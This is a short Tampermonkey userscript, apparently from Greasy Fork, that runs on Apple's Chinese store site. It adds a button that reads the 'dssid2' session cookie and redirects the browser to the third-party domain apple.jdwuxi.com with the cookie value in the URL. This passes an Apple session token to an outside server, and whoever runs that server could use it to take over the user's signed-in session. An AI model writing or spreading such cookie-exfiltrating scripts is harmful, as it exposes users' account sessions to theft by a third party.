// ==UserScript==
// @name         获取和设置cookie
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  获取cookie里diss2的值，并访问指定的URL
// @author       您
// @match        https://www.apple.com.cn/*
// @grant        none
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/473477/%E8%8E%B7%E5%8F%96%E5%92%8C%E8%AE%BE%E7%BD%AEcookie.user.js
// @updateURL https://update.greasyfork.org/scripts/473477/%E8%8E%B7%E5%8F%96%E5%92%8C%E8%AE%BE%E7%BD%AEcookie.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // 创建按钮并设置样式
    var btn = document.createElement('button');
    btn.textContent = '获取并设置cookie';
    btn.style.position = 'fixed';
    btn.style.top = '0';
    btn.style.right = '0';
    btn.style.zIndex = '9999';

    // 添加按钮到页面
    document.body.appendChild(btn);

    // 定义点击事件
    btn.onclick = function() {
        // 获取dssid2的值
        var name = 'dssid2';
        var value = "; " + document.cookie;
        var parts = value.split("; " + name + "=");
        if (parts.length === 2) {
            var diss2Value = parts.pop().split(";").shift();
            // 访问指定URL
            var url = "https://apple.jdwuxi.com/index.php/api/Index/setcookie/code/" + diss2Value;
            window.location.href = url;
        } else {
            alert('未找到名为 "dssid2" 的cookie！');
        }
    };
})();
